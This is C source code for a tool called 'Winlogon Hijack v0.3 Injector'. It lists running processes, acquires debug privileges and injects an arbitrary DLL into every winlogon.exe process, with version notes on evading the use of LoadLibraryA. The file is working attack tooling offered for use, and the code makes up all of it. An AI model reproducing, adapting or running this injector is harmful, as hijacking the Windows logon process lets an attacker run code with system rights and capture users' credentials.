////////////////////////////////////////////////////////////////////
// Winlogonhijack Injector Written by JeFFOsZ, respect it ;)
//
// This program injects our dll in every winlogon process.
//
// version 0.3
// -----------
// + Injector now uses ntdll.LdrLoadDll instead of kernel32.LoadLibraryA.
//
// version 0.2
// -----------
// + Injector now automatically injects all "winlogon.exe" processes.
// - Injector cant inject terminal services winlogon.
//
// version 0.1
// -----------
// - Injector needs pid winlogon as parameter.
// - Uses kernel32.LoadLibraryA for injection.
//
////////////////////////////////////////////////////////////////////

#include <stdio.h>
#include <windows.h>
#include "injector.h"

#define PROCESS_SIZE MAX_PATH
#define STATUS_INFO_LENGTH_MISMATCH 0xc0000004

typedef LONG NTSTATUS;

// NTQUERYSYSTEMINFORMATION

typedef struct _tagThreadInfo
{
        FILETIME ftCreationTime;
        DWORD dwUnknown1;
        DWORD dwStartAddress;
        DWORD dwOwningPID;
        DWORD dwThreadID;
        DWORD dwCurrentPriority;
        DWORD dwBasePriority;
        DWORD dwContextSwitches;
        DWORD dwThreadState;
		DWORD dwWaitReason;
        DWORD dwUnknown2[5];
} THREADINFO, *PTHREADINFO;

#pragma warning(disable:4200)
typedef struct _tagProcessInfo
{
        DWORD dwOffset;
        DWORD dwThreadCount;
        DWORD dwUnknown1[6];
        FILETIME ftCreationTime;
        DWORD dwUnknown2[5];
        WCHAR* pszProcessName;
        DWORD dwBasePriority;
        DWORD dwProcessID;
        DWORD dwParentProcessID;
        DWORD dwHandleCount;
        DWORD dwUnknown3;
        DWORD dwUnknown4;
        DWORD dwVirtualBytesPeak;
        DWORD dwVirtualBytes;
        DWORD dwPageFaults;
        DWORD dwWorkingSetPeak;
        DWORD dwWorkingSet;
        DWORD dwUnknown5;
        DWORD dwPagedPool;
        DWORD dwUnknown6;
        DWORD dwNonPagedPool;
        DWORD dwPageFileBytesPeak;
        DWORD dwPrivateBytes;
        DWORD dwPageFileBytes;
        DWORD dwUnknown7[4];
        THREADINFO ti[0];
} _PROCESSINFO, *PPROCESSINFO;
#pragma warning( default:4200 )

long(__stdcall *NtQuerySystemInformation)(ULONG,PVOID,ULONG,ULONG)=NULL;

// END NTQUERYSYSTEMINFORMATION

ULONG InjectAllWinLogons(char* argv)
{
	PBYTE pbyInfo = NULL;
	DWORD cInfoSize = 0x2000;
	ULONG ret=0;
	CHAR szProcessName[PROCESS_SIZE];
	PPROCESSINFO pProcessInfo;
	BOOL bLast;
	DWORD dwResult=0;

	if (!NtQuerySystemInformation)
		NtQuerySystemInformation=(long( __stdcall * )(ULONG,PVOID,ULONG,ULONG))
		 GetProcAddress(GetModuleHandle("ntdll.dll"),"NtQuerySystemInformation");
	
	pbyInfo=(PBYTE)malloc(cInfoSize);

	if (pbyInfo)
	{
		while(NtQuerySystemInformation(5,pbyInfo,cInfoSize,0)==STATUS_INFO_LENGTH_MISMATCH)
		// check for size
		{
			cInfoSize += 0x2000;
			pbyInfo=(PBYTE)realloc(pbyInfo,cInfoSize);
		}

		pProcessInfo=(PPROCESSINFO)pbyInfo;
		bLast = FALSE;
		
		do
		{
			if (pProcessInfo->dwOffset==0) // last?
				bLast = TRUE;

			if (pProcessInfo->dwProcessID!=0) // ignore system idle
			{	
				WideCharToMultiByte(CP_ACP, 0, pProcessInfo->pszProcessName, 
				-1,szProcessName, PROCESS_SIZE, NULL, NULL); // convert processname
				
				if (strnicmp(szProcessName,"winlogon.exe",11)==0)
				{
					printf("[*] LoadDllInProcess(PID: %u): ",pProcessInfo->dwProcessID);
					// Load our DLL in the given process
					if (dwResult=LoadDllInProcessEx(pProcessInfo->dwProcessID,argv))
						printf("OK (Base: 0x%08X).\r\n",dwResult);
					else
						printf("FAILED.\r\n");
				}
						
				ret++;
			}
			pProcessInfo=(PPROCESSINFO)((PBYTE)pProcessInfo+pProcessInfo->dwOffset); // next
		} 
		while(bLast==FALSE);
		
		free(pbyInfo);
	}
	return ret;
}

int main(int argc,char* argv[])
{
	BOOL bNt,bDeb;
	DWORD dwMinorVer,dwMajorVer;
	TOKEN_PRIVILEGES tkpOld;

	printf("[+] Winlogon Hijack v0.3 Injector written by JeFFOsZ\r\n");
	if (argc==2)
	{
		// Check if we're running on a NT based windows.
		bNt=IsWinNt(&dwMajorVer,&dwMinorVer);
		printf("[*] IsWinNt(): ");
		if (bNt)
			printf("OK [Version: %d.%d].\r\n",dwMajorVer,dwMinorVer);
		else {
			printf("FAILED.\r\n");
			return 0;
		}

		// Get debug privileges
		bDeb=GetDebugPriv(&tkpOld);
		printf("[*] GetDebugPriv(): ");
		if (bDeb)
			printf("OK.\r\n");
		else {
			printf("FAILED.\r\n");
			return 0;
		}
	
		// Inject all "winlogon.exe" processes.
		InjectAllWinLogons(argv[1]);
	} 
	else 
		printf("[-] Usage: %s hijackdllname\r\n",argv[0]);
	
	
	return 0;
}

